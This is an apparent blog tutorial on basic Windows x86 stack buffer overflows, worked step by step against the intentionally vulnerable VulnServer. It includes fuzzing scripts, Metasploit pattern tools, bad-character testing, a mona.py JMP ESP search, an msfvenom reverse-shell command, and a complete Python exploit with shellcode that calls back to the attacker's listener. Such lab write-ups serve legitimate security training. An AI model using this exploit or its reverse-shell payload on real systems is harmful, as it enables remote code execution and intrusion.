---
title: "Basic Buffer Over Flow Windows x86 Explained"
date: 2026-05-28 00:00:00 +0000
categories: [Low Level, x86Windows]
tags: [Buffer Over Flow, Ctf]
image:
  path: ../assets/img/POST(1)/thumb.jpg
  alt: BOF
---

Hello Friend, I Hope You Are Well Now . Today I'm Going To Explain the Basics of Buffer Over Flow and To Practice On What You Will Learn I Will Solve [Brainpan 1](https://vulnhub.com/entry/brainpan-1,51/) CTF . Let's Jump Into it !


## What is Buffer Over Flow ?! :

BOF is a Coding Vulnerability, Where Languages That Requires From the Developer To Manage the Memory Manually Like: ( `C, C++` ) Lacks of Checking the Length of a Specific Input ; Which Made the Attacker Able To Over Flow the Memory Locations and Manipulate It To A Maliciuos Address That Executes Bad Stuff in The End ! 

> Buffer Over Flow Exploits and Memory Allocations Differs From Platform To Another and CPU Architecture 

## Windows Memory Stack (x86 CPUs):

Stack of the Memory Used as Temporary Storage To Save Functions and Variable That Will Be Used in Execution . 

**ESP (Extended Stack Pointer)** **<- BUFFER ->**  **EBP (Extended Base Pointer)**, **EIP (Extended Instruction Pointer)**  

. _**EIP is The Most Important Part It Works as the Future Map of Memory Addresses That Instructs What Will happen The Next Step, If We Can OverWrite It To a Memory Address That Will Execute Maliciuos Code So We Can get a Shell**_ 

![StackExplained](../assets/img/POST(1)/stack.png)
*Stack Explained*

### Tools :

Since, That's Windows x86 We Will Need 

- Linux Machine (Kali)
- Windows Machine x86
- Immunity Debugger (Debug What Happens Behind the Scenes)
- VulnerServer (Learning EXE)([https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver))

#### Immunity Debugger :

Open as Admin Because the Program We Will Open Will Be Opened as Admin Too (Opened Port on Windows)

Then Click Attach and Choose the .EXE VulnerableServer

![Step1](../assets/img/POST(1)/step1.png)
*File > Attach*

![Step2](../assets/img/POST(1)/step2.png)
*Choose VulnServer*

## Detection :

1. First and Abviuos Way To Detect BOF is If You Have the **Source Code** and You Saw Vulnerable Functions Like strcpy() Without Verfication the User Input .

2. **Spiking**, Testing Random Chars and Bytes Length and See of the App Crashes or Restarts . It's Often Used Before Fuzzing .

    That is VulnServer Which If You Connected To The Machine, It Will Give You Options and You Enter `Option <VALUE>` . So We Can Test Spiking on This With The Command `generic_send_tcp`

    ![ConnectionVulnServer](../assets/img/POST(1)/c1.png)
    *Command [Value]*

    ```shell
    $ generic_send_tcp
    argc=1
    Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
    ./generic_send_tcp 192.168.1.100 701 something.spk 0 0
    ```

    .spk Script

    ```
    s_readline();
    s_string("STATS ");
    s_string_variable("x");
    ```

    ```shell
    generic_send_tcp 192.168.1.3 9999 spike.spk 0 0
    ```

    For Example, **STATS Function** Doesn't Threw Any Error or Crash All Connection Exit Codes Were 0 (Successful)

    ![noErrors](../assets/img/POST(1)/noerrors.png)
    *All Good*

    But, **TRUN Function** Was _Vulnerable_ Because the Error Threw `Access Violation` BOF

    ![Error](../assets/img/POST(1)/error.png)
    *Okay, We Got an Error*

    and You Will See That 

    ```
    EIP: 41414141 (AAAA)
    ```

    That Mean The Buffer Over Flowed Until It went To the EIP /!\

3. **Fuzzing**, To Find the _**Exact Crash Offset(0x0) EIP**_

    ```python
    #!/usr/bin/env python3

    import socket
    from sys import exit
    from termcolor import colored
    from time import sleep
    from argparse import ArgumentParser

    sa= ArgumentParser(prog= colored("Fuzz For Crash", "yellow"))
    sa.add_argument('-ip', '--ip', type= str, required= True)
    sa.add_argument('-port', '--port', type= int, required= True)
    sa.add_argument('-strbsend', '--strbsend', type= str)
    sa.add_argument('-v', '--verbose', action= "store_true", default= False)
    p= sa.parse_args()
    ip= p.ip.strip()
    port= p.port
    strbsend= p.strbsend
    sent_buffer= ''

    if strbsend :
        sent_buffer= strbsend.strip()
        
    sent_buffer= sent_buffer + ('A' * 80)
    connections= 0

    print(f"Target: {colored(ip, 'yellow')} > {colored(port, 'cyan')}")

    while True :
        try :
            socketUse= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socketUse.settimeout(3)
            socketUse.connect((ip, port))
            socketUse.send(sent_buffer.encode())
            sent_buffer += 'A' * 80
            socketUse.close()
            connections += 1
            sleep(0.1)
            if connections % 10 == 0 :
                print(f"[{colored('*', 'magenta')}] Connections: {colored(connections, 'yellow')} Buffer: {colored(len(sent_buffer), 'blue')} Bytes")
        except Exception as Error :
            print(f"[{colored('+', 'green')}] Crashed On {colored(len(sent_buffer), 'red')} Bytes")
            print(f"Error: {colored(str(Error).strip(), 'green')}")
            exit()
    ```

    That Python Script Connection To The Target Machine Port (Socket) and Sends the Buffer To Command `TRUN` and Stop When Crashes happen

    ```shell
    ./zzz.py -ip 192.168.1.3 -port 9999 -strbsend 'TRUN /.:/' -v
    ```

    ![FuzzScript](../assets/img/POST(1)/fuzzscript.png)
    *Fuzzing For it*

    When It Reached 2489 Bytes Sent, I Saw the Immunity Debugger and The Program Crashed `Access Violation`

    If, We Went Back To Say What is the EIP Value We Will See

    ![CrashEIP](../assets/img/POST(1)/crashEIP.png)
    *Crashed the Program*
    
    ```
    EIP: 00401D98 (@�)
    ```

    **We Will Use MetaSploit To Create a Pattern Length, Once We Send That Payload We Will Get a Different EIP and Then This Tool Will Automate the Process and Give it The EIP Value**

    ```shell
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2489
    ```

    ```
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3
    ```

    I Made a Anoter Python Script To Send the Payload

    ```python
    #!/usr/bin/env python3

    import socket
    from argparse import ArgumentParser
    from termcolor import colored
    from sys import exit

    sa= ArgumentParser(prog= colored("Send MSF Paylaod !", "yellow"))
    sa.add_argument('-ip', '--ip', type= str, required= True)
    sa.add_argument('-port', '--port', type= int, required= True)
    sa.add_argument('-msf', '--msf', type= str, required= True)
    p= sa.parse_args()
    ip= p.ip.strip()
    port= p.port
    msf= p.msf.strip()

    socketUse= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketUse.settimeout(3)
    socketUse.connect((ip, port))
    socketUse.send(msf.encode())

    print("[+] Payload Sent")
    ```

    ```shell
    ./send_payload.py -ip 192.168.1.3 -p 9999 -msf "TRUN /.:/$(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2489)"
    ```

    ![Sent](../assets/img/POST(1)/sent.png)
    *Sending the MSF Generated Payload*

    the EIP was **`386F4337`**

    ![OFFSET](../assets/img/POST(1)/gotoffset.png)
    *EIP Value After Sending the Payload*

    To Get the Exact 0xOFFSET We Will Another MSF Tool Which Will Find the OFFSET not Creating It Specifying the EIP in That Time

    ```shell
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2489 -q 386F4337
    ``` 

    and It Was **`2003`**

    ![EXACTOFFSET](../assets/img/POST(1)/offset.png)
    *We Got the Exact Offset*

    > **That Means To Reach The EIP From Buffer There 2003 Bytes Long + (386F4337) Hex Chars = 2003 + 4 = 2007** 
    That Will OverWrite the EIP
    {: .prompt-danger }

    To Be Sure That We Got Everything Right I will Replace the EIP With "vvvv" in Hex "76767676"

    ```python
    ('A' * 2003) + ('v' * 4)
    ```
    
    ![YesTrue](../assets/img/POST(1)/yestrue.png) 
    *We Controlled the EIP Value*

## Exploitation :

After You Have Determined the Exact Offset That After It With 4 bytes It Will Overwrite the EIP There are More Steps To Achieve Code Execution :

1. **Finding Bad Characters**

    You Must Remove Chars Like Null Byte \x00 Which Means Stop the String Flow Here.
    and Test All Chars That Will Be Gone Because Each Program Has a Function That When
    It Matches a Symbol or Specific Char It Blows It. That is an Important Step Because Any Mistake Can Prevent the Shell Code Execution (Boring Step By the Way, At least For Me)

    We Will Try **All Hex Chars** `256` With Removing Null Byte `\x00`

    ```text
    \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xbb\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
    ```

2. **Checking Memory Protections on .dll files (Get the Weakest One)**

    We Must Find a Loaded .dll File That Has This Assembly 

    ```nasm
    JMP ESP
    ```

    Because, The Stack is Changing Every Time You Execute an Program .
    
    But, The Computer When the EIP Crashes Knows Where the Exact Memory Address .
    
    Will Be Next in ESP That Will Contain our ShellCode !
    
    I Hope You Got it .

    ![YesTrue](../assets/img/POST(1)/confused.gif) 
    *A bit Confusion, I Know*

3. **Generate & Execute Shell Code (ESP Space)** 

> Ofcourse, if ASLR Enabled That Will Makes the Process in Finding the Hardcoded ESP and Using the Classic BOF Exploitation is Impossible Because Memory Addresses Will Be Randomized, You Will Rely on Other Things To Defeat ASLR .

* * *

Then, Go to the ESP and Click Follow in DUMP and See Our Sequence \x00 -> \xff

See If There is Any Bytes Changed ...

```python
#!/usr/bin/env python3

import socket

badchars=b'A' * 2003 + b'B' * 4 + b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xbb\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

socketUse= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socketUse.connect(("192.168.1.3", 9999))
socketUse.send(b'TRUN /.:/' + badchars)

print('[+] Bad Chars Sent Go and See the Debugger')
```

![YesTrue](../assets/img/POST(1)/badchars1.png)
*Send The Gift*

![YesTrue](../assets/img/POST(1)/badchars.png)
*See the Gift*

I Saw There is Not Bytes Gone ... That's Good and Straight Forward

![YesTrue](../assets/img/POST(1)/no.png)
*nothing*

Now, We Must Get a `.dll File` With `ASLR Off` and We Will use mona.py Module That Will Throw ESP Memory Addresses To Us .

Module-Repo: [https://github.com/corelan/mona](https://github.com/corelan/mona)

Put the Module in: C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands

![YesTrue](../assets/img/POST(1)/monaplace.png)
*Path*

* * *

In Immunity on the Bottom You Will Find a Bar, Type in `!mona modules` It Will Scan .dll files and Give You Memory Protection Status

![](../assets/img/POST(1)/mona.png)

We Will Find a Dll File name essfunc Which Has No Memory Protections Enabled (Not Compiled Through)

![](../assets/img/POST(1)/dll.png)
*Dll file*

So, Know We Want To find `JMP ESP` Which in Machine Code `\xFF\xE4`

![](../assets/img/POST(1)/jmp.png)
*Machine Code*

We Will Type `!mona find -s "\xff\xe4" -m essfunc.dll` -m Module -s String

![](../assets/img/POST(1)/res.png)
*Result*

![](../assets/img/POST(1)/check.png)
*Just Checking*

**Those are the Memory Return Addresses !!**

> **Windows x86 Memory Operates With Little-Endian Lowest First Because It's Easier For Legacy CPUs to Process Than Big Endian. You Will See When We Send the Jump Address That It Will Be Transfered in Backwards So You Will Understand !**

#### Generate a Shell Code :

We Will Use Metasploit Tool (msfvenom) To Generate the Shellcode Windows x86 Reverse Shell Payload

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=818 EXITFUNC=thread -f python -a x86 -b '\x00'
```

![](../assets/img/POST(1)/msfvenom.png)
*msfvenom*

Now, Open the Local Port You Specified in the Payload For me is `818`

![](../assets/img/POST(1)/open.png)
*netcat*

But, There is Another Thing You Put Before the Shell Code with is **`NOP`** (No Operation) It Just Instructs Your CPU To Do Nothing. We Use it For Buffer Over flow Just Like an Extra MeaningLess Padding if Something Slightly Happened in ESP Return Memory Address . 

```python
nop_hex= '\x90'
```

So Exploit Became

```text
Buffer(2003 Byte) -> ESP Return Memory Addr -> NOPs -> ShellCode  
```

```python
#!/usr/bin/env python3

import socket
from termcolor import colored
from sys import exit

buf =  b""
buf += b"\xdb\xc8\xd9\x74\x24\xf4\xbe\xfe\x89\x2d\x6e\x5a"
buf += b"\x2b\xc9\xb1\x52\x31\x72\x17\x03\x72\x17\x83\x3c"
buf += b"\x8d\xcf\x9b\x3c\x66\x8d\x64\xbc\x77\xf2\xed\x59"
buf += b"\x46\x32\x89\x2a\xf9\x82\xd9\x7e\xf6\x69\x8f\x6a"
buf += b"\x8d\x1c\x18\x9d\x26\xaa\x7e\x90\xb7\x87\x43\xb3"
buf += b"\x3b\xda\x97\x13\x05\x15\xea\x52\x42\x48\x07\x06"
buf += b"\x1b\x06\xba\xb6\x28\x52\x07\x3d\x62\x72\x0f\xa2"
buf += b"\x33\x75\x3e\x75\x4f\x2c\xe0\x74\x9c\x44\xa9\x6e"
buf += b"\xc1\x61\x63\x05\x31\x1d\x72\xcf\x0b\xde\xd9\x2e"
buf += b"\xa4\x2d\x23\x77\x03\xce\x56\x81\x77\x73\x61\x56"
buf += b"\x05\xaf\xe4\x4c\xad\x24\x5e\xa8\x4f\xe8\x39\x3b"
buf += b"\x43\x45\x4d\x63\x40\x58\x82\x18\x7c\xd1\x25\xce"
buf += b"\xf4\xa1\x01\xca\x5d\x71\x2b\x4b\x38\xd4\x54\x8b"
buf += b"\xe3\x89\xf0\xc0\x0e\xdd\x88\x8b\x46\x12\xa1\x33"
buf += b"\x97\x3c\xb2\x40\xa5\xe3\x68\xce\x85\x6c\xb7\x09"
buf += b"\xe9\x46\x0f\x85\x14\x69\x70\x8c\xd2\x3d\x20\xa6"
buf += b"\xf3\x3d\xab\x36\xfb\xeb\x7c\x66\x53\x44\x3d\xd6"
buf += b"\x13\x34\xd5\x3c\x9c\x6b\xc5\x3f\x76\x04\x6c\xba"
buf += b"\x11\xeb\xd9\xc5\xe4\x83\x1b\xc5\xe5\x61\x95\x23"
buf += b"\x83\x95\xf3\xfc\x3c\x0f\x5e\x76\xdc\xd0\x74\xf3"
buf += b"\xde\x5b\x7b\x04\x90\xab\xf6\x16\x45\x5c\x4d\x44"
buf += b"\xc0\x63\x7b\xe0\x8e\xf6\xe0\xf0\xd9\xea\xbe\xa7"
buf += b"\x8e\xdd\xb6\x2d\x23\x47\x61\x53\xbe\x11\x4a\xd7"
buf += b"\x65\xe2\x55\xd6\xe8\x5e\x72\xc8\x34\x5e\x3e\xbc"
buf += b"\xe8\x09\xe8\x6a\x4f\xe0\x5a\xc4\x19\x5f\x35\x80"
buf += b"\xdc\x93\x86\xd6\xe0\xf9\x70\x36\x50\x54\xc5\x49"
buf += b"\x5d\x30\xc1\x32\x83\xa0\x2e\xe9\x07\xc0\xcc\x3b"
buf += b"\x72\x69\x49\xae\x3f\xf4\x6a\x05\x03\x01\xe9\xaf"
buf += b"\xfc\xf6\xf1\xda\xf9\xb3\xb5\x37\x70\xab\x53\x37"
buf += b"\x27\xcc\x71"

memoryaddr= b'\xaf\x11\x50\x62'

devil= b'A' * 2003 + memoryaddr + (b'\x90' * (8 + 18 + 24)) + buf

try :
	socketUse= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socketUse.connect(("192.168.1.3", 9999))
	socketUse.send(b'TRUN /.:/' + devil)
except Exception as Error :
	print(f"[{colored('-', 'red')}] Something {colored('bad', 'red')} Happened")
	exit(1)

print(f'[{colored("+", "green")}] {colored("I Think You Got Shell Now", "magenta")} {colored(";", "red")}]')
```

Fire the Exploit 🔥

![](../assets/img/POST(1)/fire.png)
*Don't Think, We Got it*

and It Happened, We got the Reverse Shell

![](../assets/img/POST(1)/end.png)
*Reverse Shell*

![](../assets/img/POST(1)/cris.gif)

I Hope You Understood Buffer overFlows

Goodbye, My Friend !